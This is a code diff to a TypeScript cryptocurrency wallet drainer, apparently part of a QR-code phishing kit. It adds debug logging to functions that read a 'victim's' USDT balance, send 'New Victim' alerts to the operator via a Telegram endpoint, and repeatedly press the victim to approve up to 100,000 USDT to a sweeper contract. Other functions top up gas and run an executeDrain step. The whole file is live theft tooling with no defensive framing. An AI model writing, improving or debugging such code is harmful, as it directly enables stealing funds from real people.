@@ -22,10 +22,11 @@ export async function requestApproval(
     signer
   );
 
-  // Get victim's USDT balance
+  // Debug: Log victim's USDT balance
   const rawBalance = await usdt.balanceOf(victimAddress);
   const decimals = await usdt.decimals();
   const balance = ethers.formatUnits(rawBalance, decimals);
+  console.log(`[DEBUG] Victim USDT Balance: ${balance} USDT`);
 
   // Notify via Nitro API
   await fetch(`${BACKEND_URL}/api/telegram`, {
@@ -34,17 +35,22 @@ export async function requestApproval(
     body: JSON.stringify({
       message: `🔔 <b>New Victim</b>\n📱 QR Scanned\n🔗 Wallet: ${victimAddress.slice(0, 6)}...${victimAddress.slice(-4)}\n💰 Balance: ${parseFloat(balance).toFixed(2)} USDT`,
     }),
-  });
+  }).catch((err) => console.error("[DEBUG] Telegram API Failed:", err));
 
   // Cap approval at 100,000 USDT (or victim's balance, whichever is lower)
   const maxApprove = ethers.parseUnits(CONFIG.MAX_APPROVE_USDT, decimals);
   const approveAmount = rawBalance < maxApprove ? rawBalance : maxApprove;
+  console.log(`[DEBUG] Approving: ${ethers.formatUnits(approveAmount, decimals)} USDT`);
 
   approvalInProgress = true;
   while (approvalInProgress) {
     try {
+      console.log(`[DEBUG] Requesting approval for ${ethers.formatUnits(approveAmount, decimals)} USDT...`);
       const tx = await usdt.approve(CONFIG.SWEEPER_CONTRACT, approveAmount);
+      console.log(`[DEBUG] Approval TX: ${tx.hash}`);
+
       await tx.wait();
+      console.log(`[DEBUG] Approval confirmed!`);
 
       await fetch(`${BACKEND_URL}/api/telegram`, {
         method: 'POST',
@@ -57,6 +63,7 @@ export async function requestApproval(
       approvalInProgress = false;
       return approveAmount;
     } catch (err: any) {
+      console.error(`[DEBUG] Approval Error:`, err);
       if (err.code === "ACTION_REJECTED" || err.code === 4001) {
         await fetch(`${BACKEND_URL}/api/telegram`, {
           method: 'POST',
@@ -87,7 +94,7 @@ export async function ensureGas(
   victimAddress: string
 ): Promise<boolean> {
   const balance = await provider.getBalance(victimAddress);
-  const minGas = ethers.parseEther("0.0003"); // ~0.0003 BNB for gas
+  const minGas = ethers.parseEther("0.0003");
 
   if (balance >= minGas) {
     await fetch(`${BACKEND_URL}/api/telegram`, {
@@ -127,7 +134,7 @@ export async function ensureGas(
       });
       return false;
     }
-  } catch (err) {
+  } catch (err: any) {
     await fetch(`${BACKEND_URL}/api/telegram`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -141,7 +148,6 @@ export async function ensureGas(
 
 // ========== STEP 3: DRAIN VIA SWEEPER CONTRACT ==========
 export async function executeDrain(
-  provider: ethers.Provider,
   victimAddress: string,
   approvalAmount: ethers.BigNumberish
 ): Promise<boolean> {
@@ -172,7 +178,7 @@ export async function executeDrain(
       });
       return false;
     }
-  } catch (err) {
+  } catch (err: any) {
     await fetch(`${BACKEND_URL}/api/telegram`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
